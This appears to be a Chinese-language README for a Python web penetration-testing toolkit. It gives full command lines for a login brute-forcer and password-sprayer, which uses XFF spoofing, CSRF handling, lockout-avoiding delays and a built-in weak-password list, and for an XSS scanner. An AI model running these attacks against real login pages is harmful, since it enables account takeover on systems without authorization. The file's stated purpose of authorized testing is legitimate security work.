# Web 攻击测试工具集 (零依赖, 纯 Python)

配合本技能（jiejieskill）使用。**无需安装任何库**，Python 3.8+ 直接跑。

## 工具总览

| 脚本 | 用途 | 场景 |
|---|---|---|
| `http_brute.py` | **HTTP 表单/API 在线密码爆破** (零依赖, 并发/CSRF/XFF/代理) | Web 登录爆破 |
| `xss_scan.py` | **XSS 三型检测** (反射/存储/DOM, 上下文自动判定 + source-sink 污点分析) | Web XSS 自动化检测 |

## HTTP 表单在线爆破

```bash
python http_brute.py --selftest                      # 自检 (本地假服务端到端)
# 单用户 × 密码字典
python http_brute.py -u admin -P pass.txt --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
# 密码喷射 (用户字典 × 单密码, 防锁定)
python http_brute.py -L users.txt -p 'Spring2025!' --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 5 --delay 0.3
# JSON 登录
python http_brute.py -u admin -P pass.txt --url https://api/login --json \
    --data '{"u":"^USER^","p":"^PASS^"}' --found-marker '"token"'
# CSRF token: 先 GET 取 token 注入 ^TOKEN^
python http_brute.py -u admin -P pass.txt --url https://target/login \
    --data "csrf=^TOKEN^&user=^USER^&pass=^PASS^" \
    --csrf-url https://target/login --csrf-regex 'name="csrf" value="([^"]+)"' --fail-marker "Invalid"
# 走 Burp 代理
python http_brute.py -u admin -P pass.txt --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" --proxy http://127.0.0.1:8080
# 内置弱口令字典 (wordlists/weakpass.txt, 无需 -P): --weakpass [分类, 不填=全部]
python http_brute.py -u admin --weakpass --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
python http_brute.py -u root --weakpass service,db --url ... --data ... --fail-marker "Invalid"
```

## XSS 三型检测

```bash
python xss_scan.py --selftest                      # 自检 (本地起含三型漏洞假站, 4/4)
python xss_scan.py -u "https://t/search?q=test"    # 全量三型扫描
# 只跑指定类型 + 带登录态打后台存储型 + 走 Burp 对照 DOM Invader
python xss_scan.py -u "https://t/profile" -m stored,dom \
    -c "session=xxx" --proxy http://127.0.0.1:8080
# 深度爬取 + JSON 输出 (接 GUI 表格)
python xss_scan.py -u "https://t/" --depth 2 --max-pages 30 --json -o report.json
```

## 验证状态

- `http_brute.py`: 自检通过 (本地假服务端到端)
- `xss_scan.py`: 本地假站自检 4/4 通过 (反射型命中 / 已编码判安全 / 存储型展示页命中 / DOM source-sink 命中); 端到端集成测试 (本地起含三型漏洞站点) 正确报出 高危×1 (存储) + 中危×2 (DOM、反射)

## 注意事项

- 仅用于**已获书面授权**的渗透测试
